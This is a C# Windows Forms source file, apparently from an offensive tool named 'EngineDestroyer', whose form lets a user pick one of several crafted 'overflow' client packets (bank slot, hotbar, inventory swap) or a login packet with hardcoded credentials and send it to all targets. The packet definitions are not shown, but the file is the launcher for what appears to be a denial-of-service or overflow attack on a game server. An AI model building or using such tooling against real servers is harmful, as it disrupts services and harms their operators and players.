using System;
using System.Windows.Forms;
using EngineDestroyer.Network;
using EngineDestroyer.Network.Packets;

namespace EngineDestroyer {
    public partial class FormOverflow : Form {
        public FormOverflow() {
            InitializeComponent();
        }

        private void ButtonSend_Click(object sender, EventArgs e) {
            ClientPacket msg = null;

            if (RadioChangeBankSlot.Checked) {
                msg = new CpChangeBankSlotOverflow();
            }

            if (RadioHotbarChange.Checked) {
                msg = new CpHotbarChangeOverflow();
            }

            if (RadioHotbarUse.Checked) {
                msg = new CpHotbarUseOverflow();
            }

            if (RadioLogin.Checked) {
                msg = new CpLogin("elementum", "elementum", true);
            }

            if (RadioSwapInv.Checked) {
                msg = new CpSwapInventoryOverflow();
            }

            msg.SendToAll();
        }

        private void RadioHotbarChange_CheckedChanged(object sender, EventArgs e) {
            var msg = new CpHotbarChangeOverflow();
            LabelLog.Text = "Packet Size: " + msg.Size + " Bytes";
        }

        private void RadioHotbarUse_CheckedChanged(object sender, EventArgs e) {
            var msg = new CpHotbarUseOverflow();
            LabelLog.Text = "Packet Size: " + msg.Size + " Bytes";
        }

        private void RadioSwapInv_CheckedChanged(object sender, EventArgs e) {
            var msg = new CpSwapInventoryOverflow();
            LabelLog.Text = "Packet Size: " + msg.Size + " Bytes";
        }

        private void RadioChangeBankSlot_CheckedChanged(object sender, EventArgs e) {
            var msg = new CpChangeBankSlotOverflow();
            LabelLog.Text = "Packet Size: " + msg.Size + " Bytes";
        }

        private void RadioLogin_CheckedChanged(object sender, EventArgs e) {
            var msg = new CpLogin("elementum", "elementum", true);
            LabelLog.Text = "Packet Size: " + msg.Size + " Bytes";
        }

        private void FormOverflow_Load(object sender, EventArgs e) {
            RadioHotbarChange.Checked = true;
        }
    }
}